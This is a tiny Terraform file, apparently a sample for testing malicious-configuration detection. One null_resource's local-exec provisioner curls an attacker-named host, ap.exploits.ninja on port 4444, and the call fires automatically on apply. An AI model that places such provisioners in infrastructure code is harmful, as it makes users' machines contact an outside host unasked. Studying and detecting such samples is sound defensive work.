resource "null_resource" "example" {
}
resource "null_resource" "null" {
  provisioner "local-exec" {
    command = "curl http://ap.exploits.ninja:4444/?w00w00"
  }
}
